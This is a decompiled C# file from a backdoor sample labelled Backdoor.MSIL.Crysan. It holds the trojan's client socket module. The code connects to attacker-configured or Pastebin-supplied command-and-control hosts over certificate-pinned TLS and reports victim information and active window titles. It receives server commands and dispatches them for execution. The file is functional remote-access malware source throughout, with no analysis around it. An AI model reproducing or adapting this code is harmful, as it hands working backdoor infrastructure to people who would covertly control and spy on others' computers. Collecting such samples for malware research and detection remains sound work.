// Decompiled with JetBrains decompiler
// Type: Client.Connection.ClientSocket
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Backdoor.MSIL.Crysan.ecy-6bb030430aef2b33ca1f8db61690c001754e9c2dae78e22b11a178959cd4c7a2.exe

using Client.Handle_Packet;
using Client.Helper;
using MessagePackLib.MessagePack;
using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Client.Connection
{
  public static class ClientSocket
  {
    public static Socket TcpClient { get; set; }

    public static SslStream SslClient { get; set; }

    private static byte[] Buffer { get; set; }

    private static long HeaderSize { get; set; }

    private static long Offset { get; set; }

    private static System.Threading.Timer KeepAlive { get; set; }

    public static bool IsConnected { get; set; }

    private static object SendSync { get; } = new object();

    private static System.Threading.Timer Ping { get; set; }

    public static int Interval { get; set; }

    public static bool ActivatePong { get; set; }

    public static void InitializeClient()
    {
      try
      {
        ClientSocket.TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        {
          ReceiveBufferSize = 51200,
          SendBufferSize = 51200
        };
        if (Settings.Pastebin == "null")
        {
          string str = Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)];
          int int32 = Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);
          if (ClientSocket.IsValidDomainName(str))
          {
            foreach (IPAddress hostAddress in Dns.GetHostAddresses(str))
            {
              try
              {
                ClientSocket.TcpClient.Connect(hostAddress, int32);
                if (ClientSocket.TcpClient.Connected)
                  break;
              }
              catch
              {
              }
            }
          }
          else
            ClientSocket.TcpClient.Connect(str, int32);
        }
        else
        {
          using (WebClient webClient = new WebClient())
          {
            NetworkCredential networkCredential = new NetworkCredential("", "");
            webClient.Credentials = (ICredentials) networkCredential;
            string[] strArray = webClient.DownloadString(Settings.Pastebin).Split(new string[1]
            {
              ":"
            }, StringSplitOptions.None);
            Settings.Hosts = strArray[0];
            Settings.Ports = strArray[new Random().Next(1, strArray.Length)];
            ClientSocket.TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
          }
        }
        if (ClientSocket.TcpClient.Connected)
        {
          ClientSocket.IsConnected = true;
          ClientSocket.SslClient = new SslStream((Stream) new NetworkStream(ClientSocket.TcpClient, true), false, new RemoteCertificateValidationCallback(ClientSocket.ValidateServerCertificate));
          ClientSocket.SslClient.AuthenticateAsClient(ClientSocket.TcpClient.RemoteEndPoint.ToString().Split(':')[0], (X509CertificateCollection) null, SslProtocols.Tls, false);
          ClientSocket.HeaderSize = 4L;
          ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
          ClientSocket.Offset = 0L;
          ClientSocket.Send(IdSender.SendInfo());
          ClientSocket.Interval = 0;
          ClientSocket.ActivatePong = false;
          ClientSocket.KeepAlive = new System.Threading.Timer(new TimerCallback(ClientSocket.KeepAlivePacket), (object) null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
          ClientSocket.Ping = new System.Threading.Timer(new TimerCallback(ClientSocket.Pong), (object) null, 1, 1);
          ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int) ClientSocket.Offset, (int) ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), (object) null);
        }
        else
          ClientSocket.IsConnected = false;
      }
      catch
      {
        ClientSocket.IsConnected = false;
      }
    }

    private static bool IsValidDomainName(string name) => Uri.CheckHostName(name) != 0;

    private static bool ValidateServerCertificate(
      object sender,
      X509Certificate certificate,
      X509Chain chain,
      SslPolicyErrors sslPolicyErrors)
    {
      return Settings.ServerCertificate.Equals(certificate);
    }

    public static void Reconnect()
    {
      try
      {
        ClientSocket.SslClient?.Dispose();
        ClientSocket.TcpClient?.Dispose();
        ClientSocket.Ping?.Dispose();
        ClientSocket.KeepAlive?.Dispose();
      }
      catch
      {
      }
      ClientSocket.IsConnected = false;
    }

    public static void ReadServertData(IAsyncResult ar)
    {
      try
      {
        if (!ClientSocket.TcpClient.Connected || !ClientSocket.IsConnected)
        {
          ClientSocket.IsConnected = false;
        }
        else
        {
          int num1 = ClientSocket.SslClient.EndRead(ar);
          if (num1 > 0)
          {
            ClientSocket.Offset += (long) num1;
            ClientSocket.HeaderSize -= (long) num1;
            if (ClientSocket.HeaderSize == 0L)
            {
              ClientSocket.HeaderSize = (long) BitConverter.ToInt32(ClientSocket.Buffer, 0);
              if (ClientSocket.HeaderSize > 0L)
              {
                ClientSocket.Offset = 0L;
                ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
                while (ClientSocket.HeaderSize > 0L)
                {
                  int num2 = ClientSocket.SslClient.Read(ClientSocket.Buffer, (int) ClientSocket.Offset, (int) ClientSocket.HeaderSize);
                  if (num2 <= 0)
                  {
                    ClientSocket.IsConnected = false;
                    return;
                  }
                  ClientSocket.Offset += (long) num2;
                  ClientSocket.HeaderSize -= (long) num2;
                  if (ClientSocket.HeaderSize < 0L)
                  {
                    ClientSocket.IsConnected = false;
                    return;
                  }
                }
                new Thread(new ParameterizedThreadStart(Packet.Read)).Start((object) ClientSocket.Buffer);
                ClientSocket.Offset = 0L;
                ClientSocket.HeaderSize = 4L;
                ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
              }
              else
              {
                ClientSocket.HeaderSize = 4L;
                ClientSocket.Buffer = new byte[ClientSocket.HeaderSize];
                ClientSocket.Offset = 0L;
              }
            }
            else if (ClientSocket.HeaderSize < 0L)
            {
              ClientSocket.IsConnected = false;
              return;
            }
            ClientSocket.SslClient.BeginRead(ClientSocket.Buffer, (int) ClientSocket.Offset, (int) ClientSocket.HeaderSize, new AsyncCallback(ClientSocket.ReadServertData), (object) null);
          }
          else
            ClientSocket.IsConnected = false;
        }
      }
      catch
      {
        ClientSocket.IsConnected = false;
      }
    }

    public static void Send(byte[] msg)
    {
      lock (ClientSocket.SendSync)
      {
        try
        {
          if (!ClientSocket.IsConnected)
            return;
          byte[] bytes = BitConverter.GetBytes(msg.Length);
          ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
          ClientSocket.SslClient.Write(bytes, 0, bytes.Length);
          if (msg.Length > 1000000)
          {
            using (MemoryStream memoryStream = new MemoryStream(msg))
            {
              memoryStream.Position = 0L;
              byte[] buffer = new byte[50000];
              int count;
              while ((count = memoryStream.Read(buffer, 0, buffer.Length)) > 0)
              {
                ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
                ClientSocket.SslClient.Write(buffer, 0, count);
                ClientSocket.SslClient.Flush();
              }
            }
          }
          else
          {
            ClientSocket.TcpClient.Poll(-1, SelectMode.SelectWrite);
            ClientSocket.SslClient.Write(msg, 0, msg.Length);
            ClientSocket.SslClient.Flush();
          }
        }
        catch
        {
          ClientSocket.IsConnected = false;
        }
      }
    }

    public static void KeepAlivePacket(object obj)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "Ping";
        msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
        ClientSocket.Send(msgPack.Encode2Bytes());
        GC.Collect();
        ClientSocket.ActivatePong = true;
      }
      catch
      {
      }
    }

    private static void Pong(object obj)
    {
      try
      {
        if (!ClientSocket.ActivatePong || !ClientSocket.IsConnected)
          return;
        ++ClientSocket.Interval;
      }
      catch
      {
      }
    }
  }
}
